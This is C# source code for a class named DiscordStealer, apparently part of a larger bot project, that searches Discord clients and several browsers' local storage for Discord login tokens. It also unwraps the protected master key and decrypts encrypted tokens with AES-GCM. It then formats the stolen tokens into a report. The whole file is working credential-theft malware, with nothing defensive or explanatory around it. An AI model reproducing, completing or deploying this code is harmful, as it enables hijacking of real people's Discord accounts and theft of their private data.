using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;
using System.Linq;
using System.Security.Cryptography;
using Newtonsoft.Json.Linq;

namespace FinalBot.Stealers
{
    public class DiscordStealer
    {
        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        private readonly string[] _tokenRegexes = {
            @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
            @"mfa\.[\w-]{84}",
            @"dQw4w9WgXcQ:[^"" ]{60,160}"
        };

        public async Task<string> Run()
        {
            var tokens = new HashSet<string>();
            var paths = new Dictionary<string, string>
            {
                {"Discord", Path.Combine(_appData, "discord")},
                {"Discord Canary", Path.Combine(_appData, "discordcanary")},
                {"Discord PTB", Path.Combine(_appData, "discordptb")},
                {"Chrome", Path.Combine(_localAppData, "Google\\Chrome\\User Data\\Default")},
                {"Edge", Path.Combine(_localAppData, "Microsoft\\Edge\\User Data\\Default")},
                {"Brave", Path.Combine(_localAppData, "BraveSoftware\\Brave-Browser\\User Data\\Default")},
                {"Opera", Path.Combine(_appData, "Opera Software\\Opera Stable")},
                {"Opera GX", Path.Combine(_appData, "Opera Software\\Opera GX Stable")}
            };

            foreach (var path in paths)
            {
                if (Directory.Exists(path.Value))
                {
                    try 
                    {
                        var found = await ScanPath(path.Key, path.Value);
                        foreach (var t in found) tokens.Add(t);
                    }
                    catch { }
                }
            }

            if (tokens.Count == 0) return "❌ No Discord tokens found.";

            var report = new StringBuilder();
            report.AppendLine($"💬 *Discord Tokens Found ({tokens.Count}):*");
            foreach (var token in tokens)
            {
                report.AppendLine($"`{token}`");
            }
            return report.ToString();
        }

        private async Task<List<string>> ScanPath(string service, string rootPath)
        {
            var results = new List<string>();
            string levelDbPath = Path.Combine(rootPath, "Local Storage", "leveldb");
            if (!Directory.Exists(levelDbPath)) return results;

            byte[] masterKey = null;
            if (service.Contains("Discord"))
            {
                masterKey = GetDiscordMasterKey(rootPath);
            }

            foreach (var file in Directory.GetFiles(levelDbPath, "*.ldb").Concat(Directory.GetFiles(levelDbPath, "*.log")))
            {
                try 
                {
                    string content = File.ReadAllText(file, Encoding.UTF8);
                    foreach (var regex in _tokenRegexes)
                    {
                        foreach (Match match in Regex.Matches(content, regex))
                        {
                            string token = match.Value;
                            if (token.StartsWith("dQw4w9WgXcQ:"))
                            {
                                if (masterKey != null)
                                {
                                    string decrypted = DecryptDiscordToken(token, masterKey);
                                    if (!string.IsNullOrEmpty(decrypted)) results.Add(decrypted);
                                }
                            }
                            else 
                            {
                                results.Add(token);
                            }
                        }
                    }
                }
                catch { }
            }

            return results.Distinct().ToList();
        }

        private byte[] GetDiscordMasterKey(string rootPath)
        {
            string stateFile = Path.Combine(rootPath, "Local State");
            if (!File.Exists(stateFile)) return null;

            try 
            {
                string content = File.ReadAllText(stateFile);
                var json = JObject.Parse(content);
                string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
                if (string.IsNullOrEmpty(encryptedKey)) return null;

                byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
                byte[] key = keyWithPrefix.Skip(5).ToArray();

                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        private string DecryptDiscordToken(string encryptedToken, byte[] key)
        {
            try 
            {
                byte[] data = Convert.FromBase64String(encryptedToken.Split(':')[1]);
                byte[] iv = data.Skip(3).Take(12).ToArray();
                byte[] payload = data.Skip(15).ToArray();

                using (var aes = new AesGcm(key, 16))
                {
                    byte[] tag = payload.TakeLast(16).ToArray();
                    byte[] ciphertext = payload.SkipLast(16).ToArray();
                    byte[] plaintext = new byte[ciphertext.Length];

                    aes.Decrypt(iv, ciphertext, tag, plaintext);
                    return Encoding.UTF8.GetString(plaintext);
                }
            }
            catch { return null; }
        }
    }
}
